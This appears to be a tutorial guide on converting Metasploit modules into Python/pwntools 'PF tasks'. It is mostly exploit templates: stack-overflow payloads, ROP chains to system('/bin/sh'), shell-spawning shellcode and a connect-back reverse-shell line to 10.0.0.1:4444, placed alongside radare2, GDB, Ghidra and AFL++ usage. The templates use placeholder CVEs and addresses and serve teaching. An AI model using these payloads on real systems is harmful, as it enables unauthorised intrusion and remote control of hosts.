# PF Framework Integration Guide

## Overview

This guide describes how to integrate Metasploit Framework modules with the PF (Pwntools Framework) task system. The goal is to treat exploits as PF tasks, enabling you to leverage modern tooling like pwnlib, pwntools, gdb, ROP helpers, heap spray helpers, radare2, ghidra, and more.

## Philosophy

The integration aims to:

1. **Take what's good from MSF**:
   - Formalized exploit structure
   - Standardized command interface
   - Turnkey exploit execution
   - Large collection of working exploits

2. **Leave what's limiting**:
   - Clunky shell and option setting
   - Poor fuzzers (use AFL++/libFuzzer instead)
   - Weak enumeration tools (use nmap instead)
   - Half-baked tool wrappers
   - Ancient/obsolete modules

3. **Add PF's strengths**:
   - Python-first development
   - Native pwntools integration
   - Advanced reversing tools (radare2, ghidra)
   - Modern fuzzing (AFL++, libFuzzer with sanitizers)
   - ROP automation and heap exploitation tools
   - Educational resources

## Writing Exploits as PF Tasks

### Basic PF Task Structure

Instead of the traditional MSF console workflow, exploits become Python-based tasks:

```python
#!/usr/bin/env python3
"""
PF Task: CVE-2024-XXXXX Exploitation
"""

from pwn import *
import r2pipe
from pathlib import Path

# Configure pwntools
context.update(arch='amd64', os='linux')
context.log_level = 'info'


class ExploitTask:
    """
    Exploit task for CVE-2024-XXXXX
    
    This demonstrates the PF task pattern for exploitation.
    """
    
    def __init__(self):
        self.name = "CVE-2024-XXXXX Buffer Overflow"
        self.description = "Exploits buffer overflow in target application"
        self.author = "Your Name"
        self.cve = "CVE-2024-XXXXX"
        
        # Task configuration - simpler than MSF options
        self.config = {
            'target_host': os.getenv('TARGET_HOST', '192.168.1.100'),
            'target_port': int(os.getenv('TARGET_PORT', '9999')),
            'local_host': os.getenv('LOCAL_HOST', '192.168.1.50'),
            'local_port': int(os.getenv('LOCAL_PORT', '4444')),
        }
    
    def analyze(self, binary_path):
        """
        Analyze target binary with radare2
        """
        log.info(f"Analyzing {binary_path} with radare2...")
        
        r2 = r2pipe.open(binary_path)
        r2.cmd('aaa')  # Analyze all
        
        # Find vulnerable function
        functions = r2.cmdj('aflj')
        vuln_func = None
        for func in functions:
            if 'vulnerable' in func['name'].lower():
                vuln_func = func
                break
        
        if vuln_func:
            log.success(f"Found vulnerable function: {vuln_func['name']}")
            log.info(f"Address: {hex(vuln_func['offset'])}")
        
        # Find ROP gadgets
        log.info("Finding ROP gadgets...")
        gadgets = r2.cmd('/R pop rdi')
        
        r2.quit()
        return vuln_func, gadgets
    
    def build_rop_chain(self, binary_path):
        """
        Build ROP chain using pwntools
        """
        log.info("Building ROP chain...")
        
        elf = ELF(binary_path)
        rop = ROP(elf)
        
        # Build chain to call system("/bin/sh")
        rop.call('system', [next(elf.search(b'/bin/sh\x00'))])
        
        log.success(f"ROP chain built: {len(rop.chain())} bytes")
        return rop.chain()
    
    def fuzz_offset(self, host, port):
        """
        Find buffer overflow offset using cyclic pattern
        """
        log.info("Fuzzing to find offset...")
        
        # Generate cyclic pattern
        pattern = cyclic(1000)
        
        # Send pattern
        r = remote(host, port)
        r.send(pattern)
        r.close()
        
        # In real scenario, analyze crash with GDB to find offset
        # For demo, assume we found EIP = 'baab'
        offset = cyclic_find('baab')
        
        log.success(f"Found offset: {offset}")
        return offset
    
    def exploit(self):
        """
        Main exploit routine
        """
        log.info(f"Starting exploit against {self.config['target_host']}:{self.config['target_port']}")
        
        # Connect to target
        r = remote(self.config['target_host'], self.config['target_port'])
        
        # Build exploit buffer
        offset = 256  # From analysis
        rop_chain = b'\x90' * 8  # NOP sled
        rop_chain += asm(shellcraft.amd64.linux.sh())  # Shellcode
        
        buffer = b'A' * offset
        buffer += p64(0xdeadbeef)  # Return address
        buffer += rop_chain
        
        # Send exploit
        log.info("Sending exploit...")
        r.send(buffer)
        
        # Get shell
        log.success("Exploit sent! Dropping to interactive shell...")
        r.interactive()
    
    def exploit_with_gdb(self, binary_path):
        """
        Run exploit with GDB attached for debugging
        """
        log.info("Starting exploit with GDB debugging...")
        
        # Start process with GDB
        io = gdb.debug(binary_path, '''
            break vulnerable_function
            continue
        ''')
        
        # Build and send payload
        payload = b'A' * 256 + p64(0xdeadbeef)
        io.send(payload)
        
        # Interact
        io.interactive()
    
    def run(self, mode='exploit'):
        """
        Main task entry point
        
        Args:
            mode: 'exploit', 'analyze', 'fuzz', or 'debug'
        """
        if mode == 'analyze':
            binary = self.config.get('binary_path', './target')
            self.analyze(binary)
        
        elif mode == 'fuzz':
            self.fuzz_offset(
                self.config['target_host'],
                self.config['target_port']
            )
        
        elif mode == 'debug':
            binary = self.config.get('binary_path', './target')
            self.exploit_with_gdb(binary)
        
        else:  # exploit
            self.exploit()


# Task runner
if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='CVE-2024-XXXXX Exploit Task')
    parser.add_argument('--mode', choices=['exploit', 'analyze', 'fuzz', 'debug'],
                       default='exploit', help='Task mode')
    parser.add_argument('--target', help='Target host')
    parser.add_argument('--port', type=int, help='Target port')
    parser.add_argument('--binary', help='Binary path for analysis/debugging')
    
    args = parser.parse_args()
    
    # Create and configure task
    task = ExploitTask()
    
    if args.target:
        task.config['target_host'] = args.target
    if args.port:
        task.config['target_port'] = args.port
    if args.binary:
        task.config['binary_path'] = args.binary
    
    # Run task
    task.run(mode=args.mode)
```

## Environment Variable Configuration

Instead of MSF's `set` command, use simple environment variables or a key-value store:

```bash
# Traditional MSF way (clunky)
# msf6 > use exploit/linux/http/my_exploit
# msf6 exploit(...) > set RHOST 192.168.1.100
# msf6 exploit(...) > set RPORT 80
# msf6 exploit(...) > set LHOST 192.168.1.50
# msf6 exploit(...) > run

# PF task way (simple)
export TARGET_HOST=192.168.1.100
export TARGET_PORT=80
export LOCAL_HOST=192.168.1.50
export LOCAL_PORT=4444

python3 exploit_task.py --mode exploit
```

Or use a config file:

```yaml
# exploit_config.yaml
target:
  host: 192.168.1.100
  port: 80

local:
  host: 192.168.1.50
  port: 4444

options:
  timeout: 10
  retries: 3
```

```python
import yaml

with open('exploit_config.yaml') as f:
    config = yaml.safe_load(f)

task = ExploitTask()
task.config.update(config)
task.run()
```

## Integration with Modern Tools

### Pwntools Integration

Pwntools is first-class in PF tasks:

```python
from pwn import *

# Context configuration
context.update(arch='amd64', os='linux', log_level='info')

# Easy remote/local connections
r = remote('target.com', 9999)
# or
p = process('./vulnerable_binary')

# Shellcode generation
shellcode = asm(shellcraft.amd64.linux.sh())
shellcode = asm(shellcraft.amd64.linux.connect('10.0.0.1', 4444) + 
                shellcraft.amd64.linux.dupsh())

# ROP automation
elf = ELF('./binary')
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh\x00'))])

# Cyclic pattern for offset finding
pattern = cyclic(1000)
offset = cyclic_find('baab')

# Format string exploitation
payload = fmtstr_payload(offset, {target_addr: write_value})
```

### Radare2 Integration

Use radare2 for deep binary analysis:

```python
import r2pipe

r2 = r2pipe.open('/path/to/binary')
r2.cmd('aaa')  # Analyze all

# Get function list
functions = r2.cmdj('aflj')

# Disassemble function
disasm = r2.cmd('pdf @ main')

# Find strings
strings = r2.cmdj('izzj')

# Find ROP gadgets
gadgets = r2.cmd('/R')

# Search for patterns
results = r2.cmd('/ password')

r2.quit()
```

See [RADARE2_QUICKSTART.md](../RADARE2_QUICKSTART.md) for more.

### GDB Integration

Debug exploits interactively:

```python
from pwn import *

# Start with GDB attached
io = gdb.debug('./binary', '''
    break main
    break vulnerable_function
    continue
''')

# Send payload
io.send(payload)

# Drop to interactive mode
io.interactive()

# Or use GDB commands
gdb.attach(process('./binary'), '''
    set disassembly-flavor intel
    disassemble main
''')
```

### AFL++ / libFuzzer Integration

Use real fuzzing tools instead of MSF's basic fuzzers:

```python
# See LLVM_INTEGRATION.md for full details

from lib.msf.util.llvm_instrumentation import LLVMInstrumentation

# Compile with ASAN
instrumenter = LLVMInstrumentation()
instrumenter.compile_with_sanitizers(
    source='vulnerable.c',
    output='vulnerable_asan',
    sanitizers=['asan', 'ubsan']
)

# Run AFL++
import subprocess
subprocess.run([
    'afl-fuzz',
    '-i', 'input_corpus',
    '-o', 'findings',
    '--', './vulnerable_asan', '@@'
])
```

### Ghidra Integration

Integrate with Ghidra for advanced analysis:

```python
# Using ghidra_bridge
import ghidra_bridge

with ghidra_bridge.GhidraBridge(namespace=globals()):
    # Access Ghidra API
    program = getCurrentProgram()
    
    # Get functions
    fm = program.getFunctionManager()
    functions = fm.getFunctions(True)
    
    for func in functions:
        print(f"Function: {func.getName()}")
        print(f"  Address: {func.getEntryPoint()}")
        
        # Decompile
        decompiler = DecompInterface()
        decompiler.openProgram(program)
        results = decompiler.decompileFunction(func, 30, None)
        
        if results.decompileCompleted():
            print(f"  Decompiled:\n{results.getDecompiledFunction().getC()}")
```

## Task Organization

Organize tasks by vulnerability or campaign:

```
tasks/
├── cve_2024_12345/
│   ├── exploit.py          # Main exploit task
│   ├── analysis.py         # Binary analysis task
│   ├── fuzzer.py          # Fuzzing task
│   ├── config.yaml        # Configuration
│   └── README.md          # Documentation
│
├── campaign_name/
│   ├── recon.py           # Reconnaissance task
│   ├── exploit_1.py       # First stage exploit
│   ├── exploit_2.py       # Second stage exploit
│   ├── post_exploit.py    # Post-exploitation task
│   └── report.py          # Reporting task
│
└── lib/
    ├── common.py          # Common utilities
    ├── rop.py            # ROP helpers
    └── heap.py           # Heap exploitation helpers
```

## Educational Examples

### Example 1: Stack Buffer Overflow with ROP

```python
#!/usr/bin/env python3
"""
Educational Example: Stack Buffer Overflow with ROP

This demonstrates a complete exploitation workflow:
1. Binary analysis to find vulnerability
2. Offset calculation with cyclic patterns
3. ROP chain construction
4. Exploit delivery
"""

from pwn import *
import r2pipe

context.update(arch='amd64', os='linux')

class StackOverflowROP:
    def __init__(self, binary_path):
        self.binary = binary_path
        self.elf = ELF(binary_path)
        self.rop = ROP(self.elf)
    
    def step1_analyze(self):
        """Step 1: Analyze binary with radare2"""
        log.info("Step 1: Analyzing binary...")
        
        r2 = r2pipe.open(self.binary)
        r2.cmd('aaa')
        
        # Check security features
        log.info("Security features:")
        info = r2.cmdj('iIj')
        log.info(f"  NX: {info.get('nx', 'unknown')}")
        log.info(f"  PIE: {info.get('pie', 'unknown')}")
        log.info(f"  Canary: {info.get('canary', 'unknown')}")
        
        # Find interesting functions
        functions = r2.cmdj('aflj')
        for f in functions:
            if 'vuln' in f['name'].lower():
                log.success(f"Found vulnerable function: {f['name']}")
        
        r2.quit()
    
    def step2_find_offset(self):
        """Step 2: Find buffer overflow offset"""
        log.info("Step 2: Finding overflow offset...")
        
        # Generate cyclic pattern
        pattern = cyclic(500)
        
        # In real scenario, run with GDB and find crashed EIP/RIP
        # For demo:
        log.info("Send cyclic pattern and check crash...")
        log.info("Example: if RIP = 0x6261616161626161")
        log.info("  offset = cyclic_find(0x6261616161626161)")
        
        # Assuming we found it:
        offset = 264
        log.success(f"Offset found: {offset}")
        return offset
    
    def step3_build_rop(self):
        """Step 3: Build ROP chain"""
        log.info("Step 3: Building ROP chain...")
        
        # Method 1: Use pwntools ROP
        self.rop.raw('A' * 264)  # Padding
        self.rop.call('system', [next(self.elf.search(b'/bin/sh\x00'))])
        
        log.success("ROP chain built")
        log.info(self.rop.dump())
        
        return self.rop.chain()
    
    def step4_exploit(self, target, port):
        """Step 4: Deliver exploit"""
        log.info(f"Step 4: Exploiting {target}:{port}...")
        
        r = remote(target, port)
        
        payload = self.step3_build_rop()
        r.send(payload)
        
        log.success("Exploit delivered! Dropping to shell...")
        r.interactive()

# Usage
if __name__ == '__main__':
    exploit = StackOverflowROP('./vulnerable_binary')
    
    exploit.step1_analyze()
    offset = exploit.step2_find_offset()
    exploit.step4_exploit('192.168.1.100', 9999)
```

### Example 2: Heap Exploitation Task

See `examples/heap_exploitation_task.py` for a complete heap exploitation example with:
- Heap structure analysis
- Use-after-free exploitation
- Double-free exploitation
- Tcache poisoning

## Advantages Over Traditional MSF

| Aspect | Traditional MSF | PF Task System |
|--------|----------------|----------------|
| Configuration | `set RHOST`, `set RPORT`, etc. | Environment variables or YAML |
| Scripting | Limited Ruby scripting | Full Python with libraries |
| Tool Integration | Half-baked wrappers | Direct tool usage |
| Debugging | Limited | GDB, radare2, ghidra built-in |
| Fuzzing | Basic fuzzers | AFL++, libFuzzer with ASAN |
| ROP | Manual or basic tools | Pwntools ROP automation |
| Education | Limited documentation | Comprehensive examples |
| Flexibility | Framework constraints | Full scripting freedom |

## Migration Guide

### Converting MSF Module to PF Task

1. **Extract core exploitation logic** from `exploit()` method
2. **Replace MSF APIs** with pwntools equivalents
3. **Simplify configuration** to env vars or config files
4. **Add analysis capabilities** with radare2/ghidra
5. **Improve reliability** with better error handling
6. **Add educational value** with comments and examples

### Example Conversion

Before (MSF Ruby):
```ruby
def exploit
  connect
  buffer = 'A' * 256
  buffer << [target['Ret']].pack('V')
  buffer << payload.encoded
  sock.put(buffer)
  handler
  disconnect
end
```

After (PF Task Python):
```python
def exploit(self):
    """Exploit with detailed logging and error handling"""
    log.info(f"Connecting to {self.config['target']}...")
    
    try:
        r = remote(self.config['target'], self.config['port'])
        
        # Build payload with pwntools
        buffer = b'A' * 256
        buffer += p32(0xdeadbeef)  # Return address
        buffer += asm(shellcraft.i386.linux.sh())
        
        log.info(f"Sending {len(buffer)} byte payload...")
        r.send(buffer)
        
        log.success("Exploit delivered! Dropping to shell...")
        r.interactive()
        
    except Exception as e:
        log.error(f"Exploitation failed: {e}")
        return False
```

## Best Practices

1. **Make tasks self-contained** - Include all necessary analysis and exploitation code
2. **Add educational value** - Comment your code, explain techniques
3. **Use environment variables** - Keep configuration simple
4. **Integrate tools directly** - Don't wrap, just use
5. **Handle errors gracefully** - Tasks should fail informatively
6. **Include multiple modes** - analyze, fuzz, debug, exploit
7. **Document thoroughly** - README for each task

## Resources

- [EXPLOIT_WRITING_GUIDE.md](EXPLOIT_WRITING_GUIDE.md) - Comprehensive exploit writing
- [RADARE2_QUICKSTART.md](../RADARE2_QUICKSTART.md) - Radare2 integration
- [LLVM_INTEGRATION.md](../LLVM_INTEGRATION.md) - Fuzzing and instrumentation
- [Pwntools Documentation](https://docs.pwntools.com/)

## Contributing

When contributing PF task-style exploits:
1. Follow the task structure outlined here
2. Include analysis, fuzzing, and exploitation modes
3. Document your approach thoroughly
4. Provide setup instructions for vulnerable targets
5. Include educational comments explaining techniques
